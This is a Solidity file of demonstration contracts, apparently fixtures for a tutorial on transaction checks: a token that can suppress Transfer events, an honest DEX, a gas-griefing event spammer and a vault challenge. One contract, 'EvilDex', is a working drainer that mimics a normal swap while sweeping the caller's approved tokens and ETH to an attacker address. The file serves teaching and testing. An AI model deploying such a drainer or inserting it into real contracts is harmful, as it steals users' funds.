// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/// @notice Minimal ERC-20 (`balanceOf` at slot 0, `allowance` at slot 1).
///         Setting `emitEvents = false` creates a non-compliant "silent" token
///         that moves balances without emitting `Transfer` events.
contract Token {
    mapping(address => uint256) public balanceOf;                     // slot 0
    mapping(address => mapping(address => uint256)) public allowance; // slot 1
    string public name;
    bool public immutable emitEvents;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory n, bool e) {
        name = n;
        emitEvents = e;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        _t(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        if (emitEvents) emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        _t(from, to, amount);
    }

    function _t(address from, address to, uint256 amount) internal {
        if (emitEvents) emit Transfer(from, to, amount);
    }
}

/// @notice Honest DEX: `swap(token)` pays 1000 tokens per 1 wei of ETH.
contract HonestDex {
    function swap(Token out) external payable {
        out.transfer(msg.sender, msg.value * 1000);
    }
}

/// @notice Malicious DEX: identical `swap(token)` signature, but sweeps approved
///         tokens to `attacker` (and short-changes the caller unless `fair` is true).
contract EvilDex {
    address public immutable attacker;
    bool public immutable fair;
    Token[] public loot;

    constructor(address a, bool f, Token[] memory l) {
        attacker = a;
        fair = f;
        loot = l;
    }

    function swap(Token out) external payable {
        out.transfer(msg.sender, fair ? msg.value * 1000 : 1);
        for (uint256 i = 0; i < loot.length; i++) {
            uint256 amt = loot[i].allowance(msg.sender, address(this));
            uint256 bal = loot[i].balanceOf(msg.sender);
            if (bal < amt) amt = bal;
            if (amt > 0) loot[i].transferFrom(msg.sender, attacker, amt);
        }
        (bool ok, ) = attacker.call{value: msg.value}("");
        require(ok);
    }
}

/// @notice Emits `n` dummy events to demonstrate assertion gas griefing (Step 8).
contract Spammer {
    event Junk(uint256 i);

    function spam(uint256 n) external {
        for (uint256 i = 0; i < n; i++) {
            emit Junk(i);
        }
    }
}

/// @notice Simple vault whose owner is stored in slot 0 and secret in slot 1 (Step 10 challenge).
contract Vault {
    address public owner;  // slot 0
    uint256 public secret; // slot 1

    constructor() {
        owner = msg.sender;
    }

    function setSecret(uint256 s) external {
        require(msg.sender == owner, "Vault: not owner");
        secret = s;
    }

    function transferOwnership(address o) external {
        require(msg.sender == owner, "Vault: not owner");
        owner = o;
    }
}
